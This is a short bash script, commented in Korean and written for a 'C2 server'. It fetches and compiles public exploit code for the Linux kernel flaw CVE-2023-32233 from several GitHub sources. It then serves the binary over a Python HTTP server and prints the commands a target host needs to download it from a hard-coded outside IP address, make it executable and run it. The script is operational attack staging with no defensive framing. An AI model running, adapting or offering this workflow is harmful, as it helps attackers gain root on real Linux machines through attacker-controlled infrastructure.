#!/bin/bash
#
# CVE-2023-32233 빠른 다운로드 및 컴파일
# C2 서버에서 실행
#

cd /tmp

echo "[*] Downloading CVE-2023-32233..."

# 방법 1: git clone (익명, 인증 없이)
GIT_TERMINAL_PROMPT=0 git clone https://github.com/Liuk3r/CVE-2023-32233.git 2>/dev/null

if [ -d "CVE-2023-32233" ]; then
    echo "[+] Git clone successful"
    cd CVE-2023-32233

    echo "[*] Compiling exploit..."
    gcc -o exploit exploit.c -lmnl -lnftnl -lpthread

    if [ -f "exploit" ]; then
        echo "[+] Compilation successful!"
        ls -la exploit
    else
        echo "[-] Compilation failed"
        cat << 'EOF'

Try installing dependencies:
  sudo apt-get install -y libmnl-dev libnftnl-dev

Then compile again:
  gcc -o exploit exploit.c -lmnl -lnftnl -lpthread
EOF
    fi
else
    echo "[-] Git clone failed, trying wget..."

    # 방법 2: wget으로 직접 다운로드
    mkdir -p CVE-2023-32233
    cd CVE-2023-32233

    wget https://raw.githubusercontent.com/Liuk3r/CVE-2023-32233/main/exploit.c -O exploit.c 2>/dev/null

    if [ -f "exploit.c" ]; then
        echo "[+] Downloaded exploit.c"
        echo "[*] Compiling..."
        gcc -o exploit exploit.c -lmnl -lnftnl -lpthread

        if [ -f "exploit" ]; then
            echo "[+] Success!"
        else
            echo "[-] Compilation failed"
        fi
    else
        echo "[-] Download failed"
        echo "[!] Trying alternative repository..."

        # 방법 3: 다른 레포지토리
        cd /tmp
        rm -rf CVE-2023-32233
        wget https://github.com/theori-io/CVE-2023-32233/archive/refs/heads/main.zip -O cve.zip 2>/dev/null

        if [ -f "cve.zip" ]; then
            unzip -q cve.zip
            mv CVE-2023-32233-main CVE-2023-32233
            cd CVE-2023-32233

            if [ -f "Makefile" ]; then
                make
            else
                gcc -o exploit exploit.c -lmnl -lnftnl -lpthread 2>/dev/null
            fi
        fi
    fi
fi

cd /tmp
echo ""
echo "[*] Final check..."
if [ -f "CVE-2023-32233/exploit" ]; then
    echo "[+] Exploit ready: /tmp/CVE-2023-32233/exploit"

    # HTTP 서버 시작
    echo "[*] Starting HTTP server on port 5000..."
    python3 -m http.server 5000 &

    echo ""
    echo "[+] Download on target:"
    echo "    cd /tmp"
    echo "    wget http://13.158.67.78:5000/CVE-2023-32233/exploit"
    echo "    chmod +x exploit"
    echo "    ./exploit"
else
    echo "[-] Exploit not found"
    echo "[!] Try manual compilation or alternative methods"
fi
